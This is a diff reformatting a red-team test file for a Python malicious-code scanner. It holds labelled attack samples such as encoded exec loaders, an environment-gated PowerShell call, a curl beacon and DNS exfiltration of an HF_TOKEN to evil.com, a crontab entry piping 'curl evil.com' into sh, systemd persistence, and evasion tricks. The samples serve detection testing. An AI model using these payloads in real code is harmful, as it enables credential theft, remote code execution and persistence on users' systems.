@@ -7,6 +7,7 @@ that the "100% detection" claim holds under broader conditions.
 
 Run: python3 tests/redteam/extended_attacks.py
 """
+
 import json
 import os
 import sys
@@ -15,9 +16,9 @@ import time
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
 
 from scanner.analyzer.ast_visitor import analyze_python_source
-from scanner.analyzer.taint_engine import analyze_taint
 from scanner.analyzer.sandbox_executor import sandbox_execute
 from scanner.analyzer.symbolic_resolver import resolve_strings_in_source
+from scanner.analyzer.taint_engine import analyze_taint
 
 
 def full_scan(source):
@@ -31,25 +32,39 @@ def full_scan(source):
 
 EXTENDED_ATTACKS = [
     # --- Environmental gating ---
-    ("Gated: platform.system() == 'Windows'", True, """
+    (
+        "Gated: platform.system() == 'Windows'",
+        True,
+        """
 import platform
 if platform.system() == "Windows":
     import subprocess
     subprocess.Popen(["powershell", "-enc", "ZWNobyBoYWNrZWQ="])
-"""),
-    ("Gated: os.environ check", True, """
+""",
+    ),
+    (
+        "Gated: os.environ check",
+        True,
+        """
 import os
 if os.environ.get("CI") != "true":
     exec(__import__("base64").b64decode("aW1wb3J0IG9z").decode())
-"""),
-    ("Gated: hasattr check on module", True, """
+""",
+    ),
+    (
+        "Gated: hasattr check on module",
+        True,
+        """
 import sys
 if hasattr(sys, 'getwindowsversion'):
     __import__('os').system('whoami')
-"""),
-
+""",
+    ),
     # --- Complex multi-stage ---
-    ("Multi-stage: define class then call", True, """
+    (
+        "Multi-stage: define class then call",
+        True,
+        """
 class ModelLoader:
     def __init__(self):
         self._cmd = chr(105)+chr(100)
@@ -57,8 +72,12 @@ class ModelLoader:
         __import__('os').system(self._cmd)
 loader = ModelLoader()
 loader.load()
-"""),
-    ("Multi-stage: decorator-based execution", True, """
+""",
+    ),
+    (
+        "Multi-stage: decorator-based execution",
+        True,
+        """
 def run_on_load(func):
     func()
     return func
@@ -67,64 +86,100 @@ def run_on_load(func):
 def setup():
     import subprocess
     subprocess.run(["curl", "https://evil.com/beacon"])
-"""),
-    ("Multi-stage: generator-based lazy eval", True, """
+""",
+    ),
+    (
+        "Multi-stage: generator-based lazy eval",
+        True,
+        """
 def payload():
     yield __import__('os')
 gen = payload()
 next(gen).system('id')
-"""),
-
+""",
+    ),
     # --- Encoding variants ---
-    ("Encoding: hex string decode", True, """
+    (
+        "Encoding: hex string decode",
+        True,
+        """
 cmd = bytes.fromhex('696d706f7274206f73').decode()
 exec(cmd)
-"""),
-    ("Encoding: list(map(ord,...)) reversed", True, """
+""",
+    ),
+    (
+        "Encoding: list(map(ord,...)) reversed",
+        True,
+        """
 data = [115, 111, 46, 116, 114, 111, 112, 109, 105]
 cmd = ''.join(chr(c) for c in reversed(data))
 exec(cmd + "('os').system('id')")
-"""),
-    ("Encoding: unicode_escape", True, """
+""",
+    ),
+    (
+        "Encoding: unicode_escape",
+        True,
+        """
 cmd = "\\x69\\x6d\\x70\\x6f\\x72\\x74\\x20\\x6f\\x73"
 exec(cmd)
-"""),
-
+""",
+    ),
     # --- Framework-specific vectors ---
-    ("Framework: torch.load with map_location exec", True, """
+    (
+        "Framework: torch.load with map_location exec",
+        True,
+        """
 import types
 # Simulates a malicious torch.load callback
 def evil_map_location(storage, loc):
     __import__('os').system('id')
     return storage
-"""),
-    ("Framework: custom Dataset __getitem__ backdoor", True, """
+""",
+    ),
+    (
+        "Framework: custom Dataset __getitem__ backdoor",
+        True,
+        """
 class MaliciousDataset:
     def __getitem__(self, idx):
         if idx == 0:
             exec("import os; os.system('whoami')")
         return idx
-"""),
-
+""",
+    ),
     # --- Network exfiltration variants ---
-    ("Exfil: DNS-based exfiltration", True, """
+    (
+        "Exfil: DNS-based exfiltration",
+        True,
+        """
 import socket
 import os
 token = os.environ.get("HF_TOKEN", "none")
 socket.getaddrinfo(f"{token[:10]}.evil.com", 80)
-"""),
-    ("Exfil: ICMP/raw socket attempt", True, """
+""",
+    ),
+    (
+        "Exfil: ICMP/raw socket attempt",
+        True,
+        """
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-"""),
-
+""",
+    ),
     # --- Persistence mechanisms ---
-    ("Persistence: crontab modification", True, """
+    (
+        "Persistence: crontab modification",
+        True,
+        """
 import subprocess
 subprocess.run(["crontab", "-l"], capture_output=True)
 subprocess.run(["bash", "-c", 'echo "* * * * * curl evil.com|sh" | crontab -'])
-"""),
-    ("Persistence: systemd service creation", True, """
+""",
+    ),
+    (
+        "Persistence: systemd service creation",
+        True,
+        """
 service = '''
 [Unit]
 Description=Model Updater
@@ -135,26 +190,40 @@ WantedBy=multi-user.target
 '''
 with open("/etc/systemd/system/model-update.service", "w") as f:
     f.write(service)
-"""),
-
+""",
+    ),
     # --- Evasion techniques ---
-    ("Evasion: time.sleep delay before payload", True, """
+    (
+        "Evasion: time.sleep delay before payload",
+        True,
+        """
 import time
 time.sleep(0.1)  # Short delay to simulate conditional timing
 exec("import os; os.system('id')")
-"""),
-    ("Evasion: type() to construct class dynamically", True, """
+""",
+    ),
+    (
+        "Evasion: type() to construct class dynamically",
+        True,
+        """
 import os
 Exploit = type('Exploit', (), {'run': lambda self: os.system('id')})
 Exploit().run()
-"""),
-    ("Evasion: globals()/locals() manipulation", True, """
+""",
+    ),
+    (
+        "Evasion: globals()/locals() manipulation",
+        True,
+        """
 g = globals()
 g['__builtins__'].__import__('os').system('id')
-"""),
-
+""",
+    ),
     # --- Legitimate code (must NOT trigger) ---
-    ("LEGIT: Standard PyTorch model definition", False, """
+    (
+        "LEGIT: Standard PyTorch model definition",
+        False,
+        """
 import torch
 import torch.nn as nn
 
@@ -172,8 +241,12 @@ class SimpleModel(nn.Module):
         return x
 
 model = SimpleModel(784, 128, 10)
-"""),
-    ("LEGIT: Data preprocessing pipeline", False, """
+""",
+    ),
+    (
+        "LEGIT: Data preprocessing pipeline",
+        False,
+        """
 import json
 import os
 
@@ -186,8 +259,12 @@ def preprocess(text):
     text = text.lower().strip()
     tokens = text.split()
     return tokens
-"""),
-    ("LEGIT: Configuration loading", False, """
+""",
+    ),
+    (
+        "LEGIT: Configuration loading",
+        False,
+        """
 import os
 import json
 
@@ -196,8 +273,12 @@ if os.path.exists(config_path):
     with open(config_path) as f:
         config = json.load(f)
 batch_size = config.get("batch_size", 32) if 'config' in dir() else 32
-"""),
-    ("LEGIT: Logging and metrics", False, """
+""",
+    ),
+    (
+        "LEGIT: Logging and metrics",
+        False,
+        """
 import time
 import logging
 
@@ -209,7 +290,8 @@ def train_step(model, batch):
     elapsed = time.time() - start
     logger.info(f"Step completed in {elapsed:.3f}s, loss={loss:.4f}")
     return loss
-"""),
+""",
+    ),
 ]
 
 
@@ -247,13 +329,15 @@ def run_extended():
                 status = "\033[92m✅ CLEAN\033[0m"
 
         print(f"  {status}  {name} ({len(findings)} findings, {elapsed}ms)")
-        results.append({
-            "name": name,
-            "expected_malicious": expect_malicious,
-            "detected": is_caught,
-            "findings_count": len(findings),
-            "time_ms": elapsed,
-        })
+        results.append(
+            {
+                "name": name,
+                "expected_malicious": expect_malicious,
+                "detected": is_caught,
+                "findings_count": len(findings),
+                "time_ms": elapsed,
+            }
+        )
 
     print()
     print("=" * 70)
